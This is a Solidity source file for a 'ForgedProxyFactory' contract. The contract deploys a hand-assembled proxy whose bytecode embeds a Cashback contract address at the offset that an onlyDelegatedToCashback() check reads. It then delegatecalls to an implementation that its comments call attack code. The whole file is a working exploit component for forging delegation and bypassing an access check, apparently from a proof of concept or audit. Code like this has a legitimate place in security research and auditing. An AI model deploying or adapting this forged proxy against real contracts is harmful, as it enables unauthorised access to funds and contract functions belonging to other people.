// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract ForgedProxyFactory {
    /**
     * @notice Deploys a forged delegation proxy that points to a logic implementation.
     * @dev The deployed proxy has custom runtime bytecode.
     *      The first part of the bytecode embeds the Cashback contract address at the
     *      position expected by `onlyDelegatedToCashback()`.
     *      The second part behaves like a minimal proxy and delegates calls to `implementation`.
     * @param cashback The Cashback contract address to embed in the proxy bytecode.
     * @param implementation The logic contract that will receive delegated calls.
     * @return proxy The address of the deployed forged proxy.
     */
    function deploy(address cashback, address implementation) external returns (address proxy) {
        bytes memory runtime = abi.encodePacked(
            hex"75", // PUSH22 → prepare to push 22 bytes (used only to shape bytecode)
            bytes2(0), // padding → aligns bytes so cashback address sits at expected offset
            bytes20(cashback), // embed cashback address → this is what onlyDelegatedToCashback will read
            hex"50", // POP → discard value (we only needed it in the bytecode, not at runtime)
            hex"363d3d373d3d3d363d73", // start of minimal proxy → sets up calldata forwarding
            bytes20(implementation), // implementation address → where logic (attack code) lives
            hex"5af43d82803e903d91604357fd5bf3" // delegatecall → forward execution to implementation and return result
        );

        // creation is the bytecode used to deploy the contract (constructor bytecode)
        bytes memory creation =
            abi.encodePacked(hex"60", bytes1(uint8(runtime.length)), hex"80600b6000396000f3", runtime);

        // create() executes the creation bytecode to deploy the contract on-chain.
        assembly {
            proxy := create(0, add(creation, 0x20), mload(creation))
        }

        require(proxy != address(0), "deploy failed");
    }
}
